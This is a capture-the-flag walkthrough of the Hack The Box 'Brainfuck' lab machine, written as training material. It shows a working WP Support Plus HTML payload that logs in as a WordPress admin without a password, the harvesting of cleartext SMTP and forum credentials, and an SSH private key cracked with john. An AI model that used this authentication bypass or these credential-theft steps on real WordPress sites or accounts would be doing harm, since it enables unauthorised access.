---
title: "HTB - Brainfuck"
author: "Anubhavsingh Sawdagur"
date: "2021-04-24"
subject: "Markdown"
subtitle: "10.10.10.17"
lang: "en-GB"
book: true
classoption: oneside
code-block-font-size: \scriptsize   
output: 
  pdf_document:
    fig_caption: FALSE
---

# Brainfuck - 10.10.10.17

# Enumeration

## Nmap

```bash
nmap -p- -T4 -oA nmap/quick 10.10.10.17
```

```bash
# Nmap 7.91 scan initiated Fri Apr 23 09:17:23 2021 as: nmap -p- -T4 -oA nmap/quick 10.10.10.17
Nmap scan report for www.brainfuck.htb (10.10.10.17)
Host is up (0.24s latency).
Not shown: 65530 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https

# Nmap done at Fri Apr 23 09:21:49 2021 -- 1 IP address (1 host up) scanned in 265.59 seconds
```



## Website

### https://10.10.10.17 

![](Brainfuck.assets/image-20210423092517149.png)

### SSL Cert

![](Brainfuck.assets/image-20210423092213672.png)

user : **orestis@brainfuck.htb**

DNS Name: **www.brainfuck.htb, sup3rs3cr3t.brainfuck.htb**

The dns names are added to **/etc/hosts**

![](Brainfuck.assets/image-20210423092844295.png)

### sup3rs3cr3t.brainfuck.htb

sup3rs3cr3t.brainfuck.htb is a forum webpage.

![](Brainfuck.assets/image-20210423100437959.png)

### www.brainfuck.htb -> brainfuck.htb

**www.brainfuck.htb** redirects to **brainfuck.htb** which is a *wordpress* website.

![](Brainfuck.assets/image-20210423100221583.png)



**wpscan** is ran against the **https://brainfuck.htb**

```bash
wpscan --api-token "zwHNCijstkXlttJouhoslFZG0MYms5Bvks9FMVexaAs" --url "https://brainfuck.htb" --disable-tls-checks -o wpscan.log
```

![](Brainfuck.assets/image-20210423104733666.png)

```bash
searchsploit WP Support Plus
```

![](Brainfuck.assets/image-20210423120100898.png)

```bash
wpscan --url "https://brainfuck.htb" --disable-tls-checks --enumerate u -o wpscan_enumerate_user.log 
```

![](Brainfuck.assets/image-20210423104514064.png)

Users found:

- admin
- administrator



# Exploitation

## brainfuck.htb

### Searchploit

During enumeration, it was found that the **WP Support Plus** plugin is vulnerable to a **Privilege Escalation** attack.

```bash
searchsploit WP Support Plus 
```

![](Brainfuck.assets/image-20210424055551012.png)

```
searchsploit -x php/webapps/41006.txt 
```

![](Brainfuck.assets/image-20210424060023915.png)

### Privilege Escalation to admin on wordpress

Using the users enumerated from wpscan, this attack can be performed.
The payload was modified as show below.

![](Brainfuck.assets/image-20210424063910309.png)

```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="orestis@brainfuck.htb">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

The file is hosted using the command below.

```bash
python3 -m http.server 80
```

![](Brainfuck.assets/image-20210424063117997.png)

it is then viewed using a browser.

![](Brainfuck.assets/image-20210424063217601.png)

**Vulnerability Explanation:**

When inspecting the traffic in Burpsuite, it can be concluded that the WP Support Plus plugin sets an authenticated cookie to the user without the need of a password.

![](Brainfuck.assets/image-20210424064212334.png)

![](Brainfuck.assets/image-20210424064603321.png)

Once the script is ran, when refreshing the wordpress site, the cookies take effect and, the attacker is automatically authenticated.

![](Brainfuck.assets/image-20210424064609386.png)

### SMTP Credentials leaked

Going to the **Easy WP SMTP** plugin, information about the user can be found.

![](Brainfuck.assets/image-20210424065221953.png)

In developers console, the password can be seen in cleartext.

![](Brainfuck.assets/image-20210424065348596.png)

```html
<input type="password" name="swpsmtp_smtp_password" value="kHGuERB29DNiNE">
```

SMTP Credential: 

**orestis:kHGuERB29DNiNE**

### Evolution Mail Client

Evolution mail client is configured as shown below to see user orestis mails.

![](Brainfuck.assets/image-20210424070158690.png)

![](Brainfuck.assets/image-20210424070425913.png)

![](Brainfuck.assets/image-20210424070431548.png)

![](Brainfuck.assets/image-20210424070507569.png)

After configuring evolution, user orestis mail can be viewed.

![](Brainfuck.assets/image-20210424070539798.png)

New credentials are revealed, it is for the forum found on the subdomain **sup3rs3cr3t.brainfuck.htb** 

![](Brainfuck.assets/image-20210424070838384.png)

```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```

## sup3rs3cr3t.brainfuck.htb

Using the above credentials, the user orestic can now be accessed on the [forum](sup3rs3cr3t.brainfuck.htb).

There are 3 topics listed in the forum:

- Key
- SSH Access
- Development

![](Brainfuck.assets/image-20210424071528025.png)

It can be observed that user orestis always signs with the phrase *Orestis - Hacking for fun and profit* on topic **SSH Access**.

![](Brainfuck.assets/image-20210424072018596.png)

However on topic **Key**, the page is encrypted. But the same pattern can be seen as orestis always signs his posts with the same phrase *Orestis - Hacking for fun and profit*.

![](Brainfuck.assets/image-20210424072421469.png) 

### Decryption of the posts

After researching the encryption method, it was concluded that it is a one time pad encryption technique also known as Vernam Cipher (One Time Pad Vigenere).

Using the website [https://www.boxentriq.com/code-breaking/one-time-pad](https://www.boxentriq.com/code-breaking/one-time-pad), the key was found to be **BRAINFUCKMYBRAINFUCKMYBRAINFU**

![](Brainfuck.assets/image-20210424073446093.png)

The same result can be crossed check on the website [https://www.dcode.fr/vernam-cipher-vigenere](https://www.dcode.fr/vernam-cipher-vigenere)

![](Brainfuck.assets/image-20210424073724663.png)

When decrypting what appeared to be a link [mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr](mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr) with the pad **FUCKMYBRAINFUCKMYBRAINFUCKMYBR**, it resulted to reveal a link to the user orestis ssh public key [https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa](https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa)

![](Brainfuck.assets/image-20210424074619202.png)

```bash
curl -sk https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -o orestis.enc 
cat orestis.enc 
```

The ssh key is an encrypted key and it needs to be decrypted in order to ssh as the orestis user.

![](Brainfuck.assets/image-20210424081016859.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

The password is cracked using john.

```powershell
# cracked on windows
python ./run/ssh2john.py ./hashes/brainfuck-orestis.enc.txt | Out-File ./hashes/brainfuck-orestis.txt

# if having error: Error: UTF-16 BOM seen in input file.
# open ./hashes/brainfuck-orestis.txt in sublime and save with encoding utf-8

./run/john.exe --wordlist="D:/Documents/Bug Bounty/SecLists/Passwords/Leaked-Databases/rockyou.txt" ./hashes/brainfuck-orestis.txt
```

![](Brainfuck.assets/image-20210424083739076.png)

```
3poulakia!       (.\hashes\brainfuck-orestis.enc.txt)
```

SSH credential:

**orestis:3poulakia!**

### SSH as orestis

Using the password **3poulakia!**, brainfuck.htb can be access as the user orestis.

```bash
chmod 600 orestis.enc 
ssh -i orestis.enc orestis@brainfuck.htb 
```

![](Brainfuck.assets/image-20210424084309613.png)

### User.txt

User.txt can be found in the home directory of orestis.

![](Brainfuck.assets/image-20210424084553996.png)

> user.txt: 2c11cfbc5b959f73ac15a3310bd097c9

### Root.txt

There are some uncommon files which are only readable by orestis

- encrypt.sage
- debug.txt
- output.txt 

![](Brainfuck.assets/image-20210424084857346.png)

The file **encrypt.sage** is a python script which looks to be doing an RSA cipher on /root/root.txt

![](Brainfuck.assets/image-20210424085249183.png) 

**encrypt.sage**:

```python
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

**output.txt** contains **c**, and **debug.txt** contains **p**,**q** and **e** respectively.

![](Brainfuck.assets/image-20210424105245632.png)

The content of **/root/root.txt** can be easily decrypted given all the above information.


Using the website [https://www.dcode.fr/rsa-cipher](https://www.dcode.fr/rsa-cipher), the original content of **/root/root.txt** can be obtained.

![](Brainfuck.assets/image-20210424090253551.png)

> root.txt: 6efc1a5dbb8904751ce6566a305bb8ef

